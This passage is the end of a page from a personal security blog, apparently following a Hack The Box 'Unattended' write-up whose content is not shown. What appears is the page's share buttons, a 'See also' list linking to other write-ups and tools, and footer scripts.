</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span></span></span></code></pre></div>

        </div>

        <aside>
          <div class="p-share centered">
            <a href="https://www.buymeacoffee.com/alamot" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-coffee"></i></a>
            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2funattended_writeup%2f&t=Unattended%20%28Hack%20The%20Box%29%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2funattended_writeup%2f&text=Unattended%20%28Hack%20The%20Box%29%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2funattended_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Unattended%20%28Hack%20The%20Box%29&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2funattended_writeup%2f&description=Unattended%20%28Hack%20The%20Box%29%20write-up&media=https://alamot.github.io/images/unattended.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2funattended_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Unattended%20%28Hack%20The%20Box%29&media=https://alamot.github.io/images/unattended.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
          </div>
        </aside>
      </article>
      
      <section id="posts-section">
        <header lang="en"><h3>See also...</h3></header>
        <header lang="el"><h3>Δείτε επίσης...</h3></header>
        <div>
          
          
          
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Fortune (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Fortune (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">02 Aug 2019</time>
      <time lang="el">02 Αυγ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">17 Oct 2016</time>
      <time lang="el">17 Οκτ 2016</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Sense (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Sense (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">24 Mar 2018</time>
      <time lang="el">24 Μαρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Inception (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Inception (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">14 Apr 2018</time>
      <time lang="el">14 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Tally (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Tally (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">03 May 2018</time>
      <time lang="el">03 Μαϊ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Nineveh (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Nineveh (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">17 Dec 2017</time>
      <time lang="el">17 Δεκ 2017</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Fulcrum (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Fulcrum (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">09 Jun 2018</time>
      <time lang="el">09 Ιουν 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Querier (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Querier (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">22 Jun 2019</time>
      <time lang="el">22 Ιουν 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">FluxCapacitor (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">13 May 2018</time>
      <time lang="el">13 Μαϊ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">LaCasaDePapel (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">27 Jul 2019</time>
      <time lang="el">27 Ιουλ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/nl80211/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/wifi-sign.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">How to get info for the wireless interface using nl80211 in C</h3>
      <h3 class="title" lang="el">Πως να λάβετε πληροφορίες για την ασύρματη διεπαφή χρησιμοποιώντας την nl80211 στη C</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">09 Oct 2016</time>
      <time lang="el">09 Οκτ 2016</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Enterprise (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Enterprise (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">19 Mar 2018</time>
      <time lang="el">19 Μαρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Optimum (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Optimum (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">28 Oct 2017</time>
      <time lang="el">28 Οκτ 2017</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Node (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Node (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">03 Mar 2018</time>
      <time lang="el">03 Μαρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">21 Jul 2016</time>
      <time lang="el">21 Ιουλ 2016</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Minion (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Minion (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">10 Apr 2018</time>
      <time lang="el">10 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Falafel (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Falafel (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">23 Jun 2018</time>
      <time lang="el">23 Ιουν 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">19 Sep 2016</time>
      <time lang="el">19 Σεπ 2016</time>
    </footer>
  </a>
</article>

           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Reddish (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Reddish (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">26 Jan 2019</time>
      <time lang="el">26 Ιαν 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Legacy (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Legacy (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">19 Oct 2017</time>
      <time lang="el">19 Οκτ 2017</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Mantis (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Mantis (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">18 Feb 2018</time>
      <time lang="el">18 Φεβ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/oracle/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Ask and you shall receive</h3>
      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">04 May 2019</time>
      <time lang="el">04 Μαϊ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">22 Apr 2018</time>
      <time lang="el">22 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">09 Apr 2018</time>
      <time lang="el">09 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Path-traversal archiver</h3>
      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">14 May 2019</time>
      <time lang="el">14 Μαϊ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Reverse shells</h3>
      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">12 Apr 2018</time>
      <time lang="el">12 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/get_outlook_rules/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/flying_mail.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">How to collect Outlook rules using Powershell</h3>
      <h3 class="title" lang="el">Πως να συλλέξετε τους κανόνες του Outlook χρησιμοποιώντας Powershell</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">20 May 2022</time>
      <time lang="el">20 Μαϊ 2022</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">13 Apr 2018</time>
      <time lang="el">13 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
        </div>
      </section>
      
    </div>
   </div> 
  </div>


<footer class="l-footer">
<span class="copyleft">&copy;</span>
<span lang="en">&nbsp; Antonios Tsolis &nbsp; </span>
<span lang="el">&nbsp; Αντώνιος Τσώλης &nbsp; </span>
<script>
  function email(starting,server,firstname,lastname,subject,body,closing) {
    document.write(starting); document.write(lastname); document.write("." + firstname); document.write("@" + server);if (Boolean(subject)) { document.write("?subject=" + subject + "&body=" + body); }
    document.write(closing); }
  email("<a class='mymail' aria-label='Send me an email' href='mailto:", "gmail.com", "antonios", "tsolis", "", "","' target='_blank'><i class='fa fa-envelope-o' aria-hidden='true'></i></a>");
</script>
</footer>
<script async src="https://alamot.github.io/js/jq-btsp-lunr.min.js" onload="init()"></script>
<script>
short_months = {
  "en": ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
  "el": ["Ιαν", "Φεβ", "Μαρ", "Απρ", "Μαϊ", "Ιουν", "Ιουλ", "Αυγ", "Σεπ", "Οκτ", "Νοε", "Δεκ"]
}
function init () {
$(document).ready(function(){
  $("#lang-selector>ul>li>a").click(function(){
    var langid = this.id;
    var selText = this.text;
    document.getElementById('mainbody').setAttribute('class', langid);
    document.getElementById('mainbody').setAttribute('lang', langid);
    localStorage.setItem('language', langid);
    $("#lang-selector>a").html(selText+' <i class="fa fa-caret-down" aria-hidden="true"></i>');
  });

  $("#TableOfContents a, #content-selector a").on('click', function(e) {
    var hash = this.hash;
    if (hash) {
      e.preventDefault();
      $('html, body').animate({scrollTop: $(hash).offset().top}, 1300, function(){
        window.location.hash = hash;
      });
    }  
  });

  
});}
</script>
<script>
(function(a){var b=function(b,h,n){function d(a){if(f.body)return a();setTimeout(function(){d(a)})}function k(){c.addEventListener&&c.removeEventListener("load",k);c.media=n||"all"}var f=a.document,c=f.createElement("link"),g;if(h)g=h;else{var e=(f.body||f.getElementsByTagName("head")[0]).childNodes;g=e[e.length-1]}var m=f.styleSheets;c.rel="stylesheet";c.href=b;c.media="only x";d(function(){g.parentNode.insertBefore(c,h?g:g.nextSibling)});var l=function(a){for(var b=c.href,d=m.length;d--;)if(m[d].href===
